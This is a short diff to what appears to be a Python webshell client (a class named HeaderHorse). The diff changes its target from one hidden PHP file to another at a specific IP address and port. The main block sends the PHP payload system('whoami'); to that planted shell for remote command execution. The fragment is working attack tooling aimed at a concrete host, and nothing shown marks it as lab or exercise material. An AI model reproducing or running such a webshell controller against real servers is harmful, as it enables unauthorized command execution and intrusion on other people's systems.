@@ -47,7 +47,7 @@ class HeaderHorse:
 
 
 if __name__ == '__main__':
-    url_ = 'http://47.112.138.115:25896/include/.config_cdut.php'
+    url_ = 'http://47.112.138.115:25896/include/.config_.php'
     code_ = "system('whoami');"
     res_ = HeaderHorse.operate(url_, code_)
     result = res_.content.decode()
